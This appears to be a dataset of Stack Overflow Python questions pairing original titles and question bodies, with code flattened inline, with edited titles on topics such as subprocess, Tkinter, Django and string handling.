"Run a python script from another python script, passing in args."," I want to run a Python script from another Python script. I want to pass variables like I would using the command line.For example, I would run my first script that would iterate through a list of values (0,1,2,3) and pass those to the 2nd script script2.py 0 then script2.py 1, etc.I found Stack Overflow question 1186789 which is a similar question, but ars's answer calls a function, where as I want to run the whole script, not just a function, and balpha's answer calls the script but with no arguments. I changed this to something like the below as a test: But it is not accepting variables properly. When I print out the sys.argv in script2.py it is the original command call to first script ""['C:\script1.py'].I don't really want to change the original script (i.e. script2.py in my example) since I don't own it.I figure there must be a way to do this; I am just confused how you do it. <code>  execfile(""script2.py 1"")","Run a Python script from another Python script, passing in arguments"
"Run a python script from another python script, passing in args"," I want to run a Python script from another Python script. I want to pass variables like I would using the command line.For example, I would run my first script that would iterate through a list of values (0,1,2,3) and pass those to the 2nd script script2.py 0 then script2.py 1, etc.I found Stack Overflow question 1186789 which is a similar question, but ars's answer calls a function, where as I want to run the whole script, not just a function, and balpha's answer calls the script but with no arguments. I changed this to something like the below as a test: But it is not accepting variables properly. When I print out the sys.argv in script2.py it is the original command call to first script ""['C:\script1.py'].I don't really want to change the original script (i.e. script2.py in my example) since I don't own it.I figure there must be a way to do this; I am just confused how you do it. <code>  execfile(""script2.py 1"")","Run a Python script from another Python script, passing in arguments"
Python - Combining a url with urlunparse ," I'm writing something to 'clean' a URL. In this case all I'm trying to do is return a faked scheme as urlopen won't work without one. However, if I test this with www.python.org It'll return http:///www.python.org. Does anyone know why the extra /, and is there a way to return this without it? <code>  def FixScheme(website): from urlparse import urlparse, urlunparse scheme, netloc, path, params, query, fragment = urlparse(website) if scheme == '': return urlunparse(('http', netloc, path, params, query, fragment)) else: return website",Combining a url with urlunparse
"In python, how to precise a format when converting int to string?"," In Python, how do I specify a format when converting int to string?More precisely, I want my format to add leading zeros to have a string with constant length. For example, if the constant length is set to 4: 1 would be converted into ""0001"" 12 would be converted into ""0012"" 165 would be converted into ""0165""I have no constraint on the behaviour when the integer is greater than what can allow the given length (9999 in my example).How can I do that in Python? <code> ","In Python, how to specify a format when converting int to string?"
"In Python, how to precise a format when converting int to string?"," In Python, how do I specify a format when converting int to string?More precisely, I want my format to add leading zeros to have a string with constant length. For example, if the constant length is set to 4: 1 would be converted into ""0001"" 12 would be converted into ""0012"" 165 would be converted into ""0165""I have no constraint on the behaviour when the integer is greater than what can allow the given length (9999 in my example).How can I do that in Python? <code> ","In Python, how to specify a format when converting int to string?"
How to get Netwrok Interface Card names in Python?," I am totally new to python programming so please be patient with me.Is there anyway to get the names of the NIC cards in the machine etc. eth0, lo? If so how do you do it?I have researched but so far I have only found codes to get IP addresses and MAC addresses only such as Advice on the codes would really be appreciated. Thanks! <code>  import socketsocket.gethostbyname(socket.gethostname())",How to get Network Interface Card names in Python?
check if all elements in a list are identical, I need a function which takes in a list and outputs True if all elements in the input list evaluate as equal to each other using the standard equality operator and False otherwise.I feel it would be best to iterate through the list comparing adjacent elements and then AND all the resulting Boolean values. But I'm not sure what's the most Pythonic way to do that. <code> ,Check if all elements in a list are identical
Google Appengine or Django?, I've been learning Python and now I'd like to learn a Python-based web framework. I'm considering Google App Engine and Django. Which one should I choose? What are their unique features and learning curves? <code> ,Google App Engine or Django?
Is it possible to make an iteration in my case?," Is it possible to make an iteration instead of writing like this? ...Thank you! <code>  a = [5, 66, 7, 8, 9, ...] a[1] - a[0]a[2] - a[1]a[3] - a[2]a[4] - a[3]",pairwise traversal of a list or tuple
Python: why does this division is not performed correctly ?, I've a strange issue in Python: the division is not performed correctly: These are the results: thanks <code>  print pointB[1]print pointA[1]print pointB[0]print pointA[0]print (pointB[1]-pointA[1]) / (pointB[0]-pointA[0]) 10050100400,Why is this division not performed correctly?
Why does this division is not performed correctly?, I've a strange issue in Python: the division is not performed correctly: These are the results: thanks <code>  print pointB[1]print pointA[1]print pointB[0]print pointA[0]print (pointB[1]-pointA[1]) / (pointB[0]-pointA[0]) 10050100400,Why is this division not performed correctly?
Matlab for Python programmers," I've used MATLAB on and off before, but I need to develop a good understanding of it now, and the language I'm most familiar with is Python. Care to describe a MATLAB language feature, idiom, best practice or philosophy as compared to Python?There's a terrific amount of buzz for and resources pertaining to going the opposite direction, the MATLAB to (Python + tools) conversion, but that's not the way I need to go. Which data structures should I swap in, should I use classes, where might NumPy intuition go wrong, etc.? <code> ",MATLAB for Python programmers
"If I want to do this in python: a = ""hello""  a[2] = ""m"", what should I code?"," How do I modify a single character in a string, in Python? Something like: 'str' object does not support item assignment. <code>  a = ""hello"" a[2] = ""m""","How do I modify a single character in a string, in Python?"
"Pytho - How to remove y-axis from pylab generated picture, sample code has given"," What I want to do is remove the y-axis from the diagram, only keeping the x-axis.And adding more margin to the diagram, we can see that a lot of dots are on the edge of the canvas and don't look good. <code>  import pylab # matplotlibx_list = [1,1,1,1,5,4]y_list = [1,2,3,4,5,4]pylab.plot(x_list, y_list, 'bo')pylab.show()",How do I remove the y-axis from a Pylab-generated picture?
python: TypeError: 'NoneType' object is not iterable," What does error TypeError: 'NoneType' object is not iterable mean?I am getting it on this Python code: <code>  def write_file(data, filename): # creates file and writes list to it with open(filename, 'wb') as outfile: writer = csv.writer(outfile) for row in data: # ABOVE ERROR IS THROWN HERE writer.writerow(row)",TypeError: 'NoneType' object is not iterable in Python
Get all Request headers in Django," I need to get all the Django request headers. From what I've read, Django simply dumps everything into the request.META variable along with a lot of other data. What would be the best way to get all the headers that the client sent to my Django application?I'm going use these to build a httplib request. <code> ",How can I get all the request headers in Django?
django - 404 page displayed for dev web server (http://127.0.0.1:8000/)," I am familiarizing myself with Django.I have successfully installed and tested a demo site. I now want to switch on the admin module, to see what happens.The steps I took (granted, some were unnecessary, but I just wanted to make sure I was starting from a clean slate):Edited mysite/settings.py to enable adminEdited mysite/url.py to enable admindropped and recreated my backend dbrun ./manage.py syncdb (and responded correctly to the prompts)started the dev web server (./manange.py runserver)Here is what my mysite/settings.py file looks like (relevant section only) Here is what my mysite/urls.py file looks like: When I browse to the server url , I get this response: What am I doing wrong? <code>  INSTALLED_APPS = ( 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.sites', 'django.contrib.messages', # Uncomment the next line to enable the admin: 'django.contrib.admin', # The next lines are my models 'mysite.foo', 'mysite.foobar',) from django.contrib import adminadmin.autodiscover()urlpatterns = patterns('', # Example: # (r'^mysite/', include('mysite.foo.urls')), # Uncomment the admin/doc line below and add 'django.contrib.admindocs' # to INSTALLED_APPS to enable admin documentation: (r'^admin/doc/', include('django.contrib.admindocs.urls')), # Uncomment the next line to enable the admin: (r'^admin/', include(admin.site.urls)),) Page not found (404)Request Method: GETRequest URL: http://127.0.0.1:8000/Using the URLconf defined in mysite.urls, Django tried these URL patterns, in this order: 1. ^admin/doc/ 2. ^admin/The current URL, , didn't match any of these.You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.",Django - 404 page displayed for dev web server (http://127.0.0.1:8000/)
How to test with Python's unittets that a warning has been thrown?," I have a following function in Python and I want to test with unittest that if the function gets 0 as argument, it throws a warning. I already tried assertRaises, but since I don't raise the warning, that doesn't work.  <code>  def isZero(i): if i != 0: print ""OK"" else: warning = Warning(""the input is 0!"") print warning return i",How to test with Python's unittest that a warning has been thrown?
How to make my current splash screen allow other pieces of my code to run in the background?," Currently I have a splash screen in place. However, it does not work as a real splash screen - as it halts the execution of the rest of the code (instead of allowing them to run in the background).This is the current (reduced) arquitecture of my program, with the important bits displayed in full. How can I adapt the splash screen currently in place to actually allow the rest of the program to load in the background? Is it possible in python?Thanks! Thank you for all the help, this is how I changed the code (following the provided advice): <code>  import ...(many other imports)def ...def ...(many other definitions)class VFrams(wxFrame): wx.Frame.__init__(self, parent, -1, _(""Software""), size=(1024, 768), style=wx.DEFAULT_FRAME_STYLE) (a lot of code goes in here)class MySplashScreen(wx.SplashScreen): def __init__(self, parent=None): aBitmap = wx.Image(name=VarFiles[""img_splash""]).ConvertToBitmap() splashStyle = wx.SPLASH_CENTRE_ON_SCREEN | wx.SPLASH_TIMEOUT splashDuration = 5000 # ms wx.SplashScreen.__init__(self, aBitmap, splashStyle, splashDuration, parent) self.Bind(wx.EVT_CLOSE, self.CloseSplash) wx.Yield() def CloseSplash(self, evt): self.Hide() global frame frame = VFrame(parent=None) app.SetTopWindow(frame) frame.Show(True) evt.Skip()class MyApp(wx.App): def OnInit(self): MySplash = MySplashScreen() MySplash.Show() return Trueif __name__ == '__main__': DEBUG = viz.addText('DEBUG:', viz.SCREEN) DEBUG.setPosition(0, 0) DEBUG.fontSize(16) DEBUG.color(viz.BLACK) Start_Mainvars() Start_Config() Start_Translation() Start_DB() Start_Themes() Start_Gui() Start_Get_Isos() Start_Bars() Start_Menus() Start_Event_Handlers() app = MyApp() app.MainLoop() def show_splash(): # create, show and return the splash screen global splash bitmap = wx.Image(name=VarFiles[""img_splash""]).ConvertToBitmap() splash = wx.SplashScreen(bitmap, wx.SPLASH_CENTRE_ON_SCREEN|wx.SPLASH_NO_TIMEOUT, 0, None, -1) splash.Show() return splashclass MyApp(wx.App): def OnInit(self): global frame, splash splash = show_splash() Start_Config() Start_Translation() Start_DB() Start_Themes() Start_Gui() Start_Get_Isos() Start_Bars(""GDP1POP1_20091224_gdp"", ""1 pork"") Start_Menus() Start_Event_Handlers() frame = VFrame(parent=None) frame.Show(True) splash.Destroy() return Trueif __name__ == '__main__': DEBUG = viz.addText('DEBUG:', viz.SCREEN) DEBUG.setPosition(0, 0) DEBUG.fontSize(16) DEBUG.color(viz.BLACK) Start_Mainvars() app = MyApp() app.MainLoop()",How to adapt my current splash screen to allow other pieces of my code to run in the background?
Autotmatically Expiring variable," How to implement an automatically expiring variable in python? For example, Let the program running For one hour. I want implement an array of 6 variables, each variable in array will be automatically deleted themselves after 10 mins. And after 1 hour, there will be no variable in the array. <code> ",Automatically expiring variable
method signature for jacobian func in scipy leastsq," Can anyone provide an example of providing a Jacobian to a least squares function in scipy?I can't figure out the method signature they want - they say it should be a function, yet it's very hard to figure out what input parameters in what order this function should accept. <code> ",Method signature for Jacobian of a least squares function in scipy
method signature for jacobian func in scipy least squares," Can anyone provide an example of providing a Jacobian to a least squares function in scipy?I can't figure out the method signature they want - they say it should be a function, yet it's very hard to figure out what input parameters in what order this function should accept. <code> ",Method signature for Jacobian of a least squares function in scipy
Python: use regular expression to remove the white space each line, ^(\s+) only removes the whitespace from the first line. How do I remove the front whitespace from all the lines? <code> ,Python: use regular expression to remove the white space from all lines
Accessing previous array element in django template for loop.," I'm new to django and can't find a way to get this to work in django templates. The idea is to check if previous items first letter is equal with current ones, like so: Maybe i'm trying to do this in wrong way and somebody can point me in right direction. <code>  {% for item in items %} {% ifequal item.name[0] previous_item.name[0] %} {{ item.name[0] }} {% endifequal %} {{ item.name }}<br />{% endforeach %}","In a Django template for loop, checking if current item different from previous item"
Python perl bindings," There exists a Perl module that provides the perfect functionality for my Python app.Is there any way for me to utilize it? (it is complicated, it would take me a month to port it)I don't want to have to spawn a subprocess for every usage, as I need it several hundred thousand times (it is a specific type of data parser). Thanks for your advice.EDIT: asked for the module. It's Mail::DeliveryStatus::BounceParser. It matches mail delivery status notifications to a list of strings that may indicate a bounced mail. (it runs the DSN body/headers through a mass of regexes as well as other tests. it's a seriously awesome module.) <code> ",How can I use a Perl module from Python?
How can I tokenize a piece of text in python," I am a nurse and I know python but I am not an expert, just used it to process DNA sequencesWe got hospital records written in human languages and I am supposed to insert these data into a database or csv file but they are more than 5000 lines and this can be so hard. All the data are written in a consistent format let me show you an example I should get the following data Another example And I get the order is not consistent by when I say in ....... so in is a keyword and all the text after is a place until i find another keywordAt the beginnning He or She determine sex, got ........ whatever follows is a group of symptoms that i should split according to the separator which can be a comma, hypen or whatever but it's consistent for the same linedied ..... hours later also should get how many hours, sometimes the patient is stil alive and discharged ....etcThat's to say we have a lot of conventions and I think if i can tokenize the text with keywords and patterns i can get the job done. So please if you know a useful function/modules/tutorial/tool for doing that preferably in python (if not python so a gui tool would be nice) Some few information: <code>  11/11/2010 - 09:00am : He got nausea, vomiting and died 4 hours later Sex: MaleSymptoms: Nausea VomitingDeath: TrueDeath Time: 11/11/2010 - 01:00pm 11/11/2010 - 09:00am : She got heart burn, vomiting of blood and died 1 hours later in the operation room Sex: FemaleSymptoms: Heart burn Vomiting of bloodDeath: TrueDeath Time: 11/11/2010 - 10:00am there are a lot of rules to express various medical data but here are few examples- Start with the same date/time format followed by a space followd by a colon followed by a space followed by He/She followed space followed by rules separated by and- Rules: * got <symptoms>,<symptoms>,.... * investigations were done <investigation>,<investigation>,<investigation>,...... * received <drug or procedure>,<drug or procedure>,..... * discharged <digit> (hour|hours) later * kept under observation * died <digit> (hour|hours) later * died <digit> (hour|hours) later in <place>other rules do exist but they follow the same idea",Medical information extraction using Python
"in python, what's the way to call a function dinamically?"," I would like to do something like: But you can't call the string as a function (will get an error).How can I achieve this without switching and without using a list of lambdas or functions?Explicitly I want to refer the function by name. <code>  dct = ['do_this', 'do_that']dct[0]() // call do_this",What's the way to call a function dynamically in Python?
"in python, what's the way to call a function dynamically?"," I would like to do something like: But you can't call the string as a function (will get an error).How can I achieve this without switching and without using a list of lambdas or functions?Explicitly I want to refer the function by name. <code>  dct = ['do_this', 'do_that']dct[0]() // call do_this",What's the way to call a function dynamically in Python?
"""Caching"" attributes of classes in Python"," I'm writing a class in python and I have an attribute that will take a relatively long time to compute, so I only want to do it once. Also, it will not be needed by every instance of the class, so I don't want to do it by default in __init__. I'm new to Python, but not to programming. I can come up with a way to do this pretty easily, but I've found over and over again that the 'Pythonic' way of doing something is often much simpler than what I come up with using my experience in other languages.Is there a 'right' way to do this in Python? <code> ",Caching class attributes in Python
python: is it possible to list all defined function name in a .py file? ," I defined a .py file in this format:foo.py I import it from another file:main.py Is it possible list all functions name, e.g. [""foo1"", ""foo2"", ""foo3""]?Thanks for your help, I made a class for what I want, pls comment if you have suggestion <code>  def foo1(): passdef foo2(): passdef foo3(): pass from foo import * # orimport foo class GetFuncViaStr(object): def __init__(self): d = {} import foo for y in [getattr(foo, x) for x in dir(foo)]: if callable(y): d[y.__name__] = y def __getattr__(self, val) : if not val in self.d : raise NotImplementedError else: return d[val] ",Is it possible to list all functions in a module?
"Python Tkinter Matplotlib - Hide Axis Labels, Figure Title, Font Options, Line Colors?"," I'm trying to hide the axis labels on the first subplot at 211.I'd like to label the figure, not just a subplot (reference: ""Isub Event Characteristics"").How can I control font properties like size, font, color? Thank you in advance. <code>  f = Figure()vdsvgsPlot = f.add_subplot(211)vdsvgsPlot.plot(theLister()[3],theLister()[0])vdsvgsPlot.plot(theLister()[3],theLister()[1])isubPlot = f.add_subplot(212)isubPlot.plot(theLister()[3],theLister()[2])plotCanvas = FigureCanvasTkAgg(f, master)toolbar = NavigationToolbar2TkAgg(plotCanvas, master)plotCanvas.get_tk_widget().pack()",[matplotlib] Hiding Axis Labels
"Python Tkinter Matplotlib - Hide Axis Labels, Figure Title, Font Options?"," I'm trying to hide the axis labels on the first subplot at 211.I'd like to label the figure, not just a subplot (reference: ""Isub Event Characteristics"").How can I control font properties like size, font, color? Thank you in advance. <code>  f = Figure()vdsvgsPlot = f.add_subplot(211)vdsvgsPlot.plot(theLister()[3],theLister()[0])vdsvgsPlot.plot(theLister()[3],theLister()[1])isubPlot = f.add_subplot(212)isubPlot.plot(theLister()[3],theLister()[2])plotCanvas = FigureCanvasTkAgg(f, master)toolbar = NavigationToolbar2TkAgg(plotCanvas, master)plotCanvas.get_tk_widget().pack()",[matplotlib] Hiding Axis Labels
Replace method in Python," Possible Duplicate: How to find positions of the list maximum? A question from homework:Dene a function censor(words,nasty) that takes a list of words, andreplaces all the words appearing in nasty with the word CENSORED, andreturns the censored list of words. I see solution like this:find an index of nastyreplace words matching that indexwith ""CENSORED""but i get stuck on finding the index.. <code>  >>> censor([it,is,raining], [raining])[it,is,CENSORED]",How to find index of an element in Python list?
"newbie python subprocess problem: ""write error: Broken pipe"""," Thanks to the helpful suggestions below:So it seems to be fixed when I separate commands into individual calls to Popenstderr=subprocess.PIPE as an argument to each Popen chain.The New code: Original Post:I've spent too long trying to solve a problem piping a simple subprocess.Popen.Code: Output for file ~1000 lines in length: Output for file >241 lines in length: Output for file <241 lines in length is fine.I have been reading the docs and googling like mad but there is something fundamental about the subprocess module that I'm missing ... maybe to do with buffers. I've tried p.stdout.flush() and playing with the buffer size and p.wait(). I've tried to reproduce this with commands like 'sleep 20; cat moderatefile' but this seems to run without error.  <code>  import subprocessimport shleximport loggingdef run_shell_commands(cmds): """""" Run commands and return output from last call to subprocess.Popen. For usage see the test below. """""" # split the commands cmds = cmds.split(""|"") cmds = list(map(shlex.split,cmds)) logging.info('%s' % (cmds,)) # run the commands stdout_old = None stderr_old = None p = [] for cmd in cmds: logging.info('%s' % (cmd,)) p.append(subprocess.Popen(cmd,stdin=stdout_old,stdout=subprocess.PIPE,stderr=subprocess.PIPE)) stdout_old = p[-1].stdout stderr_old = p[-1].stderr return p[-1]pattern = '""^85567 ""'file = ""j""cmd1 = 'grep %s %s | sort -g -k3 | head -10 | cut -d"" "" -f2,3' % (pattern, file)p = run_shell_commands(cmd1)out = p.communicate()print(out) import subprocesscmd = 'cat file | sort -g -k3 | head -20 | cut -f2,3' % (pattern,file)p = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)for line in p.stdout: print(line.decode().strip()) ...sort: write failed: standard output: Broken pipesort: write error ...sort: fflush failed: standard output: Broken pipesort: write error","newbie python subprocess: ""write error: Broken pipe"""
How to make a class method in python?, In ruby you can do this: How can this be done in python. I need a method of a class to be called without it being called on an instance of the class. When I try to do this I get this error: This is what I tried: <code>  class A def self.a 'A.a' endendputs A.a #-> A.a unbound method METHOD must be called with CLASS instance as first argument (got nothing instead) class A def a(): return 'A.a'print A.a(),What is the Python equivalent of a Ruby class method?
"why ""return 100 if i < 10 else pass"" not works in python?", All; Why this not works in python? I suppose this code may works same as: Thanks! <code>  def foo(i): return 100 if i < 10 else pass return 200 if i < 20 else pass return 1 def foo(i): if i < 10: return 100 elif i < 20: return 200 else: return 1,"why ""return 100 if i < 10 else pass"" is not valid in python?"
python looping seems to not follow sequence?," I feel like I'm missing something obvious here! outputs: Whereas surely it should output: What's going wrong here? <code>  seq = {'a': ['1'], 'aa': ['2'], 'aaa': ['3'], 'aaaa': ['4'], 'aaaaa': ['5']}for s in seq: print(s) aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa",Looping seems to not follow sequence
Using decorators on lambdas in Python?," Is there any syntax for using a decorator on a lambda function in Python? Example: Results in this output: Yet when I try the same with a lambda: I get this: I feel like this might be a good way to make lambdas more versatile by allowing statements to be ""injected"" into them. But if there exists such a feature, I don't know what the syntax is. <code>  def simpledecorator(f): def new_f(): print ""Using a decorator: "" f() return new_f@simpledecoratordef hello(): print ""Hello world!"" >>> hello()Using a simple decorator:Hello world! @anotherdecoratorf = lambda x: x * 2 File ""<stdin"", line 2 f = lambda x: x * 2 ^ SyntaxError: invalid syntax",How to apply decorators to lambdas?
Python/Tkinter: Interactively validating Entry widget content," What is the recommended technique for interactively validating content in a tkinter Entry widget?I've read the posts about using validate=True and validatecommand=command, and it appears that these features are limited by the fact that they get cleared if the validatecommand command updates the Entry widget's value.Given this behavior, should we bind on the KeyPress, Cut, and Paste events and monitor/update our Entry widget's value through these events? (And other related events that I might have missed?)Or should we forget interactive validation altogether and only validate on FocusOut events? <code> ",Interactively validating Entry widget content in tkinter
sorted() using Generator Expressions Rather Than Lists," After seeing the discussion here: Python - generate the time difference I got curious. I also initially thought that a generator is faster than a list, but when it comes to sorted() I don't know. Is there any benefit to sending a generator expression to sorted() rather than a list? Does the generator expression end up being made into a list inside sorted() before sorting anyway?EDIT: It grieves me to only be able to accept one answer, as I feel a lot of responses have helped to clarify the issue. Thanks again to everyone. <code> ",sorted() using generator expressions rather than lists
Why do I have to wait for a script run with python's subprocess module to finish before running the script again? ," I'm running a Perl script through the subprocess module in Python on Linux. The function that runs the script is called several times with variable input. However, if I run this function, say, twice, the execution of the first process will stop when the second process starts. I can get my desired behavior by adding after calling the script, so I'm not really stuck. However, I want find out why I cannot run the script using subprocess as many times as I want, and have the script make these computations in parallel, without having to wait for it to finish between each run.UPDATEThe culprit was not so exciting: the perl script used a common file that was rewritten for each execution. However, the lesson I learned from this was that the garbage collector does not delete the process once it starts running, because this had no influence on my script once I got it sorted out. <code>  def script_runner(variable_input): out_file = open('out_' + variable_input, 'wt') error_file = open('error_' + variable_input, 'wt') process = subprocess.Popen(['perl', 'script', 'options'], shell=False, stdout=out_file, stderr=error_file) process.wait()",Why do I have to use .wait() with python's subprocess module? 
even numbers python list," How do I create a list and only extract or search out the even numbers in that list? Create a function even_only(l) that takes a list of integers as its only argument. Thefunction will return a new list containing all (and only) the elements of l which are evenly divisible by 2. The original list l shall remain unchanged.For examples, even_only([1, 3, 6, 10, 15, 21, 28]) should return [6, 10, 28], andeven_only([1, 4, 9, 16, 25]) should return [4, 16].Hint: Start by creating an empty list, and whenever you encounter an even number in it, add it to your list, then at the end, return your list. <code> ",Even numbers a list?
python: how to convert a datetime string back to datetime object?," I am storing a datetime string in a database. Now I face a problem. When I fetch the string from the database, I need to convert it back to a datetime object...Any easy way to do that?The string of datetime looks like: <code>  2010-11-13 10:33:54.227806",how to convert a datetime string back to datetime object?
Infinitely Nested Dictionary in Python," Does anyone know if there's a standard class for an infinitely nestable dictionary in Python?I'm finding myself repeating this pattern: If I want to add ""another layer"" (e.g. d['abc']['def']['xyz']['wrt']), I have to define another nesting of defaultdicts.To generalize this pattern, I've written a simple class that overrides __getitem__ to automatically create the next nested dictionary.e.g. However, does anyone know of a pre-existing implementation of this idea? I've tried Googling, but I'm not sure what this would be called. <code>  d = defaultdict(lambda: defaultdict(lambda: defaultdict(int)))d['abc']['def']['xyz'] += 1 d = InfiniteDict(('count',0),('total',0))d['abc']['def']['xyz'].count += 0.24d['abc']['def']['xyz'].total += 1d['abc']['def']['xyz']['wrt'].count += 0.143d['abc']['def']['xyz']['wrt'].total += 1",Is there a standard class for an infinitely nested defaultdict?
python: possible to filter dict?," I have a dict with following structure: The key is int typed and it's not sorted.Now I want all the elements whose key is >= 6.Is there easy way to do that? <code>  {5:""djdj"", 6:""8899"", 7:""998kdj""}",How to to filter dict to select only keys greater than a value?
Python list comprehension rebind names even after scope of comprehension. Is this right?," Comprehensions are having some unexpected interactions with scoping. Is this the expected behavior?I've got a method: At the risk of whining, this is a brutal source of errors. As I write new code, I just occasionally find very weird errors due to rebinding -- even now that I know it's a problem. I need to make a rule like ""always preface temp vars in list comprehensions with underscore"", but even that's not fool-proof.The fact that there's this random time-bomb waiting kind of negates all the nice ""ease of use"" of list comprehensions. <code>  def leave_room(self, uid): u = self.user_by_id(uid) r = self.rooms[u.rid] other_uids = [ouid for ouid in r.users_by_id.keys() if ouid != u.uid] other_us = [self.user_by_id(uid) for uid in other_uids] r.remove_user(uid) # OOPS! uid has been re-bound by the list comprehension above # Interestingly, it's rebound to the last uid in the list, so the error only shows # up when len > 1",List comprehension rebinds names even after scope of comprehension. Is this right?
Python escape special characters," Does Python have a function that I can use to escape special characters in a string?For example, I'm ""stuck"" :\ should become I\'m \""stuck\"" :\\. <code> ",Escape special characters in a Python string
Python escape regex special characters," Does Python have a function that I can use to escape special characters in a string?For example, I'm ""stuck"" :\ should become I\'m \""stuck\"" :\\. <code> ",Escape special characters in a Python string
Escape regex special characters in a Python string," Does Python have a function that I can use to escape special characters in a string?For example, I'm ""stuck"" :\ should become I\'m \""stuck\"" :\\. <code> ",Escape special characters in a Python string
Python mechanize add form field," I'm trying to log into a website using Python and Mechanize, however, I'm running into trouble when trying to get the POST data to behave as I want.Essentially I want to replicate this using mechanize and Python: The form looks like this: Setting the appropriate values and submitting the form isn't a problem, but that leaves out the ""action=login""-part. Now the question is, how do I add the action=login part?Edit: Okay, so I added a hidden field named action and set the value to login. Analyzing the TCP stream with Wireshark, the POST data is indeed structured the way it should. However, it seems that mechanize is messing with my urlencoding (I have already urlencoded the values specifically for the charset that the website uses). For example, my username contains an - which I have urlencoded to %C5. However, when it's sent with mechanize, it's displayed as %25C5.How do I stop mechanize from changing the strings?EDIT: I realized that rather than fighting mechanize, I could just not urlencode my strings before sending them. Case closed.  <code>  wget --quiet --save-cookies cookiejar --keep-session-cookies --post-data ""action=login&login_nick=USERNAME&login_pwd=PASSWORD"" -O outfile.htm http://domain.com/index.php <login POST http://domain.com/index.php application/x-www-form-urlencoded <TextControl(login_nick=USERNAME)> <PasswordControl(login_pwd=PASSWORD)> <CheckboxControl(login_auto=[1])> <SubmitButtonControl(<None>=) (readonly)>> response = self.browser.open(self.url+""/index.php"")self.browser.select_form(name=""login"")self.browser[""login_nick""] = self.encoded_usernameself.browser[""login_pwd""] = self.encoded_passwordself.browser.method = ""POST""response = self.browser.open(self.browser.submit())print (response.read())",Python mechanize login to website
Generate Tkinter buttons dynamically," I want to generate n amount of Tkinter Buttons which do different things. I have this code: If boardWidth is 5, though I get buttons labelled 1 to 5, when clicked they all do Board.playColumn(5, Board.getCurrentPlayer()).I need the first button to do Board.playColumn(1, Board.getCurrentPlayer()), the second to do Board.playColumn(2, Board.getCurrentPlayer()) and so on. <code>  import Tkinter as tkfor i in range(boardWidth): newButton = tk.Button(root, text=str(i+1), command=lambda: Board.playColumn(i+1, Board.getCurrentPlayer())) Board.boardButtons.append(newButton)",Generate Tkinter Buttons dynamically
"Static files in Flask - robot.txt, sitemap.xml"," Is there any clever solution to store static files in Flask's application root directory.robots.txt and sitemap.xml are expected to be found in /, so my idea was to create routes for them: There must be something more convenient :) <code>  @app.route('/sitemap.xml', methods=['GET'])def sitemap(): response = make_response(open('sitemap.xml').read()) response.headers[""Content-type""] = ""text/plain"" return response","Static files in Flask - robot.txt, sitemap.xml (mod_wsgi)"
help in python with font size and block Text Class in Tkinter , How to increase the font size of a Text widget? <code> ,How to increase the font size of a Text widget?
how to get all administrators in google appengine," I want to programmatically retrieve a list of all the app administrators from within the app. However, I've found no APIs in User Service section that can accomplish this. Is there any way or any undocumented API to do this? <code> ",Google App Engine - How to get a list of all app administrators?
[python] extract numbers of a string," I would like to extract all the numbers contained in a string. Which is better suited for the purpose, regular expressions or the isdigit() method?Example: Result: <code>  line = ""hello 12 hi 89"" [12, 89]",How to extract numbers from a string in Python?
Extract numbers of a string," I would like to extract all the numbers contained in a string. Which is better suited for the purpose, regular expressions or the isdigit() method?Example: Result: <code>  line = ""hello 12 hi 89"" [12, 89]",How to extract numbers from a string in Python?
Python: Extract numbers of a string," I would like to extract all the numbers contained in a string. Which is better suited for the purpose, regular expressions or the isdigit() method?Example: Result: <code>  line = ""hello 12 hi 89"" [12, 89]",How to extract numbers from a string in Python?
Python: Extract numbers from a string," I would like to extract all the numbers contained in a string. Which is better suited for the purpose, regular expressions or the isdigit() method?Example: Result: <code>  line = ""hello 12 hi 89"" [12, 89]",How to extract numbers from a string in Python?
how in python to split a string with unknown number of spaces as separator?," I need a function similar to str.split(' ') but there might be more than one space, and different number of them between the meaningful characters. Something like this: Can I somehow use regular expressions to catch those spaces in between? <code>  s = ' 1234 Q-24 2010-11-29 563 abc a6G47er15 'ss = s.magic_split()print(ss) # ['1234', 'Q-24', '2010-11-29', '563', 'abc', 'a6G47er15']",Split a string with unknown number of spaces as separator in Python
The Tkinter Canvas Widget," I've been messing with the Tkinter Canvas widget in order to see if I could make some aesthetically pleasing widgets, and I have a few questions. First, why is there a light grey border around my Canvas widget, and how do I get rid of it?Secondly, why is the top left most position in the Canvas (2,2)? It seems like it should be (0,0).My current script:  <code>  from Tkinter import *master = Tk()master.configure(bg='black')master.wm_attributes(""-topmost"", 1)w = Canvas(master, width=150, height=40, bd=0,relief='ridge',)w.pack()color = 100x0 = 2y0 = 2x1 = 151y1 = 2while y0 < 20 : r = color g = color b = color rgb = r, g, b Hex = '#%02x%02x%02x' % rgb w.create_line(x0, y0, x1, y1,fill=str(Hex), width=1) color = color - 2 y0 = y0 + 1 y1 = y1 + 1color = 10while y0 < 40 : r = color g = color b = color rgb = r, g, b Hex = '#%02x%02x%02x' % rgb w.create_line(x0, y0, x1, y1,fill=str(Hex), width=1) color = color + 4 y0 = y0 + 1 y1 = y1 + 1mainloop()",How do I remove the light grey border around my Canvas widget?
Creating a python dictionary from a line of text," I have a generated file with thousands of lines like the following:CODE,XXX,DATE,20101201,TIME,070400,CONDITION_CODES,LTXT,PRICE,999.0000,QUANTITY,100,TSN,1510000001Some lines have more fields and others have fewer, but all follow the same pattern of key-value pairs and each line has a TSN field.When doing some analysis on the file, I wrote a loop like the following to read the file into a dictionary: ...which is fine and does exactly what I want it to (the print is just a trivial example).However, it doesn't feel particularly ""pythonic"" to me and the line with: Which just feels ""clunky"" (how many times does it iterate over the fields?).Is there a better way of doing this in Python 2.6 with just the standard modules to hand? <code>  #!/usr/bin/env pythonfrom sys import argvrecords = {}for line in open(argv[1]): fields = line.strip().split(',') record = dict(zip(fields[::2], fields[1::2])) records[record['TSN']] = recordprint 'Found %d records in the file.' % len(records) dict(zip(fields[::2], fields[1::2]))",How to create a dictionary from a line of text?
Packing python files to single .py script, Does anybody know if there is any tool for packing a Python project that uses several files and modules into a single script?  <code> ,Packing Python files into a single .py script
